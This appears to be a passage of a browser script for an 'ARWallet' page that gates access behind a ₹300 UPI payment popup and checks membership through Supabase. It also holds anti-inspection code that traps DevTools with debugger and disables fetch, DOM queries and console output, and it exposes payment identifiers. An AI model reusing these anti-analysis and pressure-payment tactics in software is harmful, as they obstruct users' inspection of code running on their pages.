(async () => {

// ╔══════════════════════════════════════════════════════════════════════════╗
// ║                     DEVELOPER CONTROL FLAGS                             ║
// ║  Set true/false to show or hide features for users                      ║
// ╠══════════════════════════════════════════════════════════════════════════╣
const SHOW_NOTIFICATION_BAR  = true;   // true = users see the top warning bar
const SHOW_PAYMENT_POPUP     = true;   // true = users see the ₹300 payment popup
const NOTIFICATION_MESSAGE   = '⚠️  arb is closing Tomorrow'; // edit this text
// ╚══════════════════════════════════════════════════════════════════════════╝

// ── CLEANUP: Safe reset before each run to prevent stacking crashes ────────
if (window._dtInterval) { clearInterval(window._dtInterval); window._dtInterval = null; }
if (window._guardPoll)  { clearInterval(window._guardPoll);  window._guardPoll  = null; }
try {
  Object.defineProperty(window, '_authPassed', { value: false, writable: true, configurable: true });
} catch(e) {}
window._authPassed = false;
// Remove old payment popup if present from a previous run
const _oldPopup = document.getElementById('__ar_payment_overlay__');
if (_oldPopup) _oldPopup.remove();
// ──────────────────────────────────────────────────────────────────────────

// ── NOTIFICATION BAR — always visible when script is running ─────────────
(function _showNotifBar() {
  const _oldBar = document.getElementById('__ar_notif_bar__');
  if (_oldBar) _oldBar.remove();

  // ── Developer flag check ──────────────────────────────────────────────────
  if (!SHOW_NOTIFICATION_BAR) return; // developer disabled

  // ── Notification bar ON/OFF setting (persisted in localStorage) ──────────
  const _notifKey = '__ar_notif_enabled__';
  if (localStorage.getItem(_notifKey) === 'off') return; // hidden by user

  const _bar = document.createElement('div');
  _bar.id = '__ar_notif_bar__';
  _bar.style.cssText = [
    'position:fixed',
    'top:0','left:0','width:100%',
    'background:#d97706',
    'color:#fff',
    'text-align:center',
    'font-family:system-ui,-apple-system,sans-serif',
    'font-size:14px',
    'font-weight:600',
    'padding:10px 36px 10px 0',
    'z-index:2147483647',
    'letter-spacing:0.3px',
    'box-shadow:0 2px 8px rgba(0,0,0,0.25)',
    'display:flex',
    'align-items:center',
    'justify-content:center'
  ].join(';');

  // Message text
  const _msg = document.createElement('span');
  _msg.textContent = NOTIFICATION_MESSAGE;
  _bar.appendChild(_msg);

  // ✕ Close / turn-off button
  const _closeBtn = document.createElement('button');
  _closeBtn.textContent = '✕';
  _closeBtn.title = 'Hide notification bar';
  _closeBtn.style.cssText = [
    'position:absolute',
    'right:10px',
    'top:50%',
    'transform:translateY(-50%)',
    'background:rgba(255,255,255,0.25)',
    'border:none',
    'color:#fff',
    'font-size:14px',
    'font-weight:700',
    'width:24px',
    'height:24px',
    'border-radius:50%',
    'cursor:pointer',
    'line-height:1',
    'padding:0'
  ].join(';');
  _closeBtn.addEventListener('click', function() {
    localStorage.setItem(_notifKey, 'off');
    _bar.remove();
    // Show a tiny "Notifications off" toast
    const _t = document.createElement('div');
    _t.textContent = '🔕 Notification bar hidden';
    _t.style.cssText = [
      'position:fixed','bottom:20px','left:50%',
      'transform:translateX(-50%)',
      'background:#333','color:#fff',
      'padding:8px 16px','border-radius:20px',
      'font-family:system-ui','font-size:13px',
      'z-index:2147483647','opacity:0',
      'transition:opacity 0.3s'
    ].join(';');
    document.body.appendChild(_t);
    requestAnimationFrame(() => { requestAnimationFrame(() => { _t.style.opacity = '1'; }); });
    setTimeout(() => { _t.style.opacity = '0'; setTimeout(() => _t.remove(), 350); }, 2500);
  });
  _bar.appendChild(_closeBtn);

  document.body ? document.body.appendChild(_bar)
    : document.addEventListener('DOMContentLoaded', () => document.body.appendChild(_bar));

  // ── Re-enable helper: call window.__ar_notif_on() in console to turn back on
  window.__ar_notif_on = function() {
    localStorage.setItem(_notifKey, 'on');
    alert('✅ Notification bar re-enabled. Refresh or re-run the script.');
  };
  window.__ar_notif_off = function() {
    localStorage.setItem(_notifKey, 'off');
    const _b = document.getElementById('__ar_notif_bar__');
    if (_b) _b.remove();
    alert('🔕 Notification bar disabled.');
  };
})();
// ─────────────────────────────────────────────────────────────────────────

// ── SETTINGS PANEL — gear icon bottom-right, toggle notif bar + payment popup
(function _showSettingsPanel() {
  const _notifKey = '__ar_notif_enabled__';

  // ── Gear button ────────────────────────────────────────────────────────────
  const _oldGear = document.getElementById('__ar_settings_gear__');
  if (_oldGear) _oldGear.remove();

  const _gear = document.createElement('button');
  _gear.id = '__ar_settings_gear__';
  _gear.textContent = '⚙️';
  _gear.title = 'ARWallet Settings';
  _gear.style.cssText = [
    'position:fixed','bottom:20px','right:20px',
    'width:44px','height:44px',
    'border-radius:50%',
    'background:linear-gradient(135deg,#5f2ded,#8b5cf6)',
    'color:#fff','border:none',
    'font-size:20px','line-height:1',
    'cursor:pointer',
    'box-shadow:0 4px 14px rgba(95,45,237,0.45)',
    'z-index:2147483646',
    'display:flex','align-items:center','justify-content:center'
  ].join(';');

  // ── Settings drawer ────────────────────────────────────────────────────────
  const _oldPanel = document.getElementById('__ar_settings_panel__');
  if (_oldPanel) _oldPanel.remove();

  const _panel = document.createElement('div');
  _panel.id = '__ar_settings_panel__';
  _panel.style.cssText = [
    'position:fixed','bottom:74px','right:16px',
    'width:260px',
    'background:#fff',
    'border-radius:16px',
    'box-shadow:0 12px 40px rgba(0,0,0,0.18)',
    'font-family:system-ui,-apple-system,sans-serif',
    'z-index:2147483646',
    'overflow:hidden',
    'display:none',
    'flex-direction:column'
  ].join(';');

  // Header
  const _hdr = document.createElement('div');
  _hdr.style.cssText = [
    'background:linear-gradient(135deg,#5f2ded,#8b5cf6)',
    'color:#fff','padding:12px 16px',
    'font-weight:700','font-size:14px',
    'display:flex','align-items:center','justify-content:space-between'
  ].join(';');
  _hdr.innerHTML = '<span>⚙️ ARWallet Settings</span>';
  const _hdrClose = document.createElement('button');
  _hdrClose.textContent = '✕';
  _hdrClose.style.cssText = 'background:none;border:none;color:#fff;font-size:16px;cursor:pointer;padding:0;line-height:1;';
  _hdrClose.onclick = () => { _panel.style.display = 'none'; };
  _hdr.appendChild(_hdrClose);

  // ── Row builder helper ─────────────────────────────────────────────────────
  function _row(icon, label, sublabel) {
    const r = document.createElement('div');
    r.style.cssText = 'display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f3f4f6;gap:12px;';
    const ico = document.createElement('span');
    ico.textContent = icon;
    ico.style.cssText = 'font-size:20px;flex-shrink:0;';
    const txt = document.createElement('div');
    txt.style.cssText = 'flex:1;';
    const lbl = document.createElement('div');
    lbl.textContent = label;
    lbl.style.cssText = 'font-size:13px;font-weight:600;color:#1a1a1a;';
    const sub = document.createElement('div');
    sub.textContent = sublabel;
    sub.style.cssText = 'font-size:11px;color:#888;margin-top:1px;';
    txt.appendChild(lbl); txt.appendChild(sub);
    r.appendChild(ico); r.appendChild(txt);
    return r;
  }

  // ── Toggle helper ──────────────────────────────────────────────────────────
  function _makeToggle(isOn, onChange) {
    const wrap = document.createElement('div');
    wrap.style.cssText = 'position:relative;width:42px;height:24px;flex-shrink:0;cursor:pointer;';
    const track = document.createElement('div');
    track.style.cssText = [
      'position:absolute','inset:0','border-radius:12px',
      'transition:background 0.2s',
      'background:' + (isOn ? '#5f2ded' : '#d1d5db')
    ].join(';');
    const knob = document.createElement('div');
    knob.style.cssText = [
      'position:absolute','top:3px',
      'left:' + (isOn ? '21px' : '3px'),
      'width:18px','height:18px','border-radius:50%',
      'background:#fff',
      'box-shadow:0 1px 4px rgba(0,0,0,0.2)',
      'transition:left 0.2s'
    ].join(';');
    let state = isOn;
    wrap.appendChild(track); wrap.appendChild(knob);
    wrap.addEventListener('click', function() {
      state = !state;
      track.style.background = state ? '#5f2ded' : '#d1d5db';
      knob.style.left = state ? '21px' : '3px';
      onChange(state);
    });
    return wrap;
  }

  // ── Row 1: Notification Bar toggle ────────────────────────────────────────
  const _notifRow = _row('🔔', 'Notification Bar', 'Show/hide the top warning bar');
  const _notifToggle = _makeToggle(
    localStorage.getItem(_notifKey) !== 'off',
    function(on) {
      if (on) {
        localStorage.setItem(_notifKey, 'on');
        // Re-show bar
        const _oldBar = document.getElementById('__ar_notif_bar__');
        if (_oldBar) _oldBar.remove();
        const _bar = document.createElement('div');
        _bar.id = '__ar_notif_bar__';
        _bar.textContent = NOTIFICATION_MESSAGE;
        _bar.style.cssText = [
          'position:fixed','top:0','left:0','width:100%',
          'background:#d97706','color:#fff','text-align:center',
          'font-family:system-ui,-apple-system,sans-serif',
          'font-size:14px','font-weight:600',
          'padding:10px 0','z-index:2147483647',
          'letter-spacing:0.3px',
          'box-shadow:0 2px 8px rgba(0,0,0,0.25)'
        ].join(';');
        document.body.appendChild(_bar);
        _showToast('🔔 Notification bar enabled');
      } else {
        localStorage.setItem(_notifKey, 'off');
        const _b = document.getElementById('__ar_notif_bar__');
        if (_b) _b.remove();
        _showToast('🔕 Notification bar hidden');
      }
    }
  );
  _notifRow.appendChild(_notifToggle);

  // ── Row 2: Payment Gateway popup button ───────────────────────────────────
  const _payRow = _row('💳', 'Payment Gateway', 'Open ₹300 payment popup');
  const _payBtn = document.createElement('button');
  _payBtn.textContent = 'Open';
  _payBtn.style.cssText = [
    'background:linear-gradient(135deg,#5f2ded,#8b5cf6)',
    'color:#fff','border:none','border-radius:8px',
    'padding:6px 14px','font-size:12px','font-weight:700',
    'cursor:pointer','flex-shrink:0'
  ].join(';');
  _payBtn.addEventListener('click', function() {
    _panel.style.display = 'none';
    // Remove existing popup if any
    const _old = document.getElementById('__ar_payment_overlay__');
    if (_old) _old.remove();
    // Build payment popup
    const _ov = document.createElement('div');
    _ov.id = '__ar_payment_overlay__';
    _ov.style.cssText = [
      'position:fixed','inset:0','background:rgba(0,0,0,0.65)',
      'z-index:2147483647','display:flex',
      'align-items:center','justify-content:center',
      'font-family:system-ui,-apple-system,sans-serif'
    ].join(';');
    const _bx = document.createElement('div');
    _bx.style.cssText = [
      'background:#fff','border-radius:20px','padding:28px 24px 24px',
      'width:300px','text-align:center',
      'box-shadow:0 20px 60px rgba(0,0,0,0.35)','position:relative'
    ].join(';');
    // Close btn
    const _cl = document.createElement('button');
    _cl.textContent = '✕';
    _cl.style.cssText = 'position:absolute;top:12px;right:14px;background:none;border:none;font-size:18px;cursor:pointer;color:#888;line-height:1;';
    _cl.onclick = () => _ov.remove();
    // Content
    const _ti = document.createElement('div');
    _ti.innerHTML = '💳 <strong>Payment Gateway</strong>';
    _ti.style.cssText = 'font-size:20px;margin-bottom:6px;color:#1a1a1a;';
    const _su = document.createElement('div');
    _su.textContent = 'Complete ₹300 payment to get access.';
    _su.style.cssText = 'font-size:13px;color:#666;margin-bottom:14px;';
    const _bn = document.createElement('div');
    _bn.innerHTML = '💳 Pay <strong>₹300</strong> to get access';
    _bn.style.cssText = 'background:linear-gradient(135deg,#5f2ded,#8b5cf6);color:#fff;border-radius:10px;padding:10px;font-size:15px;margin-bottom:14px;';
    const _pl = document.createElement('div');
    _pl.innerHTML = '<span style="color:#5f2ded;font-weight:700;font-size:13px">📱 UPI: <strong style="font-size:15px;color:#1a1a1a">9641260174@ybl</strong></span>';
    _pl.style.cssText = 'margin-bottom:12px;';
    // Copy UPI btn
    const _cp = document.createElement('button');
    _cp.textContent = '📋 Copy UPI ID';
    _cp.style.cssText = 'background:#f3f0ff;border:1.5px solid #c4b5fd;color:#5f2ded;border-radius:8px;padding:7px 16px;font-size:13px;cursor:pointer;margin-bottom:12px;font-weight:600;width:100%;';
    _cp.onclick = () => {
      navigator.clipboard && navigator.clipboard.writeText('9641260174@ybl').then(() => {
        _cp.textContent = '✅ Copied!';
        setTimeout(() => { _cp.textContent = '📋 Copy UPI ID'; }, 2000);
      });
    };
    // PhonePe button
    const _pp = document.createElement('button');
    _pp.textContent = '🔗 Open PhonePe';
    _pp.style.cssText = 'display:block;width:100%;background:linear-gradient(135deg,#5f2ded,#7c3aed);color:#fff;border:none;border-radius:10px;padding:11px 16px;font-size:14px;font-weight:700;margin-bottom:10px;cursor:pointer;';
    _pp.addEventListener('click', function() {
      var _p = "pa=9641260174%40ybl&pn=ARWallet&am=300&cu=INR&tn=ARWallet+Access+Payment";
      try { window.open("intent://pay?" + _p + "#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=https%3A%2F%2Fphonepe.com%2F;end", "_blank"); } catch(e) {}
      setTimeout(function() {
        try {
          var _ifr = document.createElement("iframe");
          _ifr.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:none;";
          _ifr.src = "upi://pay?" + _p;
          document.body.appendChild(_ifr);
          setTimeout(function(){ try{ _ifr.remove(); }catch(e){} }, 2500);
        } catch(e) {}
      }, 300);
    });
    const _nt = document.createElement('div');
    _nt.textContent = 'After payment, contact admin to activate.';
    _nt.style.cssText = 'font-size:11px;color:#999;line-height:1.5;';
    _bx.append(_cl, _ti, _su, _bn, _pl, _cp, _pp, _nt);
    _ov.appendChild(_bx);
    _ov.addEventListener('click', function(e){ if(e.target===_ov) _ov.remove(); });
    document.body.appendChild(_ov);
    // Auto-launch PhonePe
    setTimeout(function() {
      try {
        var _p2 = "pa=9641260174%40ybl&pn=ARWallet&am=300&cu=INR&tn=ARWallet+Access+Payment";
        var _ifr2 = document.createElement("iframe");
        _ifr2.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:none;";
        _ifr2.src = "upi://pay?" + _p2;
        document.body.appendChild(_ifr2);
        setTimeout(function(){ try{ _ifr2.remove(); }catch(e){} }, 2500);
      } catch(e) {}
    }, 800);
  });
  _payRow.appendChild(_payBtn);

  // ── Toast helper ──────────────────────────────────────────────────────────
  function _showToast(msg) {
    const t = document.createElement('div');
    t.textContent = msg;
    t.style.cssText = [
      'position:fixed','bottom:80px','left:50%',
      'transform:translateX(-50%)','background:#333',
      'color:#fff','padding:8px 16px','border-radius:20px',
      'font-family:system-ui','font-size:13px',
      'z-index:2147483647','opacity:0','transition:opacity 0.3s','white-space:nowrap'
    ].join(';');
    document.body.appendChild(t);
    requestAnimationFrame(() => { requestAnimationFrame(() => { t.style.opacity='1'; }); });
    setTimeout(() => { t.style.opacity='0'; setTimeout(()=>t.remove(),350); }, 2500);
  }

  // Assemble panel
  _panel.append(_hdr, _notifRow, _payRow);
  document.body.appendChild(_panel);
  document.body.appendChild(_gear);

  // Toggle panel on gear click
  _gear.addEventListener('click', function() {
    _panel.style.display = _panel.style.display === 'none' ? 'flex' : 'none';
  });

  // Close panel if clicking outside
  document.addEventListener('click', function(e) {
    if (!_panel.contains(e.target) && e.target !== _gear) {
      _panel.style.display = 'none';
    }
  }, true);
})();
// ─────────────────────────────────────────────────────────────────────────

// ── LAYER 1: Nuke helper — called by any layer that detects tampering ─────
function _nuke(reason) {
  window._authPassed = false;
  window.fetch = () => new Promise(() => {});
  window.XMLHttpRequest = function(){return{open:()=>{},send:()=>{},setRequestHeader:()=>{}};};
  document.querySelector = () => null;
  document.querySelectorAll = () => [];
  console.log = () => {}; console.warn = () => {}; console.error = () => {};
  // do NOT wipe body — keep page visible so payment popup stays
  throw new Error(""); // silent halt
}

// ── LAYER 2: Runtime gate key — real code CANNOT run without this ─────────
// _gk is generated ONLY after Supabase confirms the member.
// It is derived from the live API response so it cannot be hardcoded.
let _gk = null;

// ── LAYER 3: Canary — detects if the auth section was cut/removed ─────────
// Written at the very top of the IIFE. If auth lines are stripped,
// _canaryVal won't match window.__c_ and poison fires in 1 second.
window.__c_ = Math.random().toString(36).slice(2);
const _canaryVal = window.__c_;

// ── LAYER 4: DevTools trap — slows down anyone trying to inspect/edit ─────
window._dtInterval = setInterval(() => {
  const _t = performance.now();
  debugger;
  if (performance.now() - _t > 150) _nuke("devtools");
}, 800);

// ── LAYER 5: Supabase auth (your original check) ──────────────────────────
let _uid = null;
  try {
    const _raw = localStorage.getItem("userInfo");
    const _info = _raw ? JSON.parse(_raw) : null;
    _uid = String(_info?.value?.memberId || _info?.memberId || "").trim();
  } catch (e) { _uid = null; }

  if (!_uid) {
    clearInterval(window._dtInterval);
    alert("❌ Could not read account info.\nPlease log in to ARWallet and try again.");
    return;
  }
  const _sb = await fetch(
    "https://yhhrkirlabyghtczabqh.supabase.co/rest/v1/members" +
    "?member_id=eq." + encodeURIComponent(_uid) +
    "&active=eq.true&select=member_id",
    {
      headers: {
        apikey: "sb_publishable_VAd887a32f8HihbGKeLiJw_lkN6eIse",
        Authorization: "Bearer sb_publishable_VAd887a32f8HihbGKeLiJw_lkN6eIse",
      },
    }
  ).then(r => r.json()).catch(() => []);

if (!Array.isArray(_sb) || _sb.length === 0) {
    clearInterval(window._dtInterval);
    if (!SHOW_PAYMENT_POPUP) return; // developer disabled payment popup
    // ── QR Payment Popup ──────────────────────────────────────────────────────
    (function _showPaymentPopup() {
      const _overlay = document.createElement("div");
      _overlay.id = "__ar_payment_overlay__";
      _overlay.style.cssText = [
        "position:fixed",
        "inset:0",
        "background:rgba(0,0,0,0.65)",
        "z-index:2147483647",
        "display:flex",
        "align-items:center",
        "justify-content:center",
        "font-family:system-ui,-apple-system,sans-serif"
      ].join(";");

      const _box = document.createElement("div");
      _box.style.cssText = [
        "background:#fff",
        "border-radius:20px",
        "padding:28px 24px 24px",
        "width:300px",
        "text-align:center",
        "box-shadow:0 20px 60px rgba(0,0,0,0.35)",
        "position:relative"
      ].join(";");

      // No close button for non-members

      // Lock icon + title
      const _title = document.createElement("div");
      _title.innerHTML = "🔒 <strong>Access Denied</strong>";
      _title.style.cssText = "font-size:20px;margin-bottom:6px;color:#1a1a1a";

      // Subtitle
      const _sub = document.createElement("div");
      _sub.textContent = "This account is not authorized.";
      _sub.style.cssText = "font-size:13px;color:#666;margin-bottom:14px";

      // Pay banner
      const _banner = document.createElement("div");
      _banner.innerHTML = "💳 Pay <strong>₹300</strong> to get access";
      _banner.style.cssText = [
        "background:linear-gradient(135deg,#5f2ded,#8b5cf6)",
        "color:#fff",
        "border-radius:10px",
        "padding:10px",
        "font-size:15px",
        "margin-bottom:14px"
      ].join(";");

      // PhonePe label
      const _ppLabel = document.createElement("div");
      _ppLabel.innerHTML = `<span style="color:#5f2ded;font-weight:700;font-size:13px">📱 Pay to: <strong style="font-size:15px;color:#1a1a1a">+918101585828</strong></span>`;
      _ppLabel.style.cssText = "margin-bottom:8px";

      // QR image
      const _qr = document.createElement("img");
      _qr.src = "data:image/jpeg;base64,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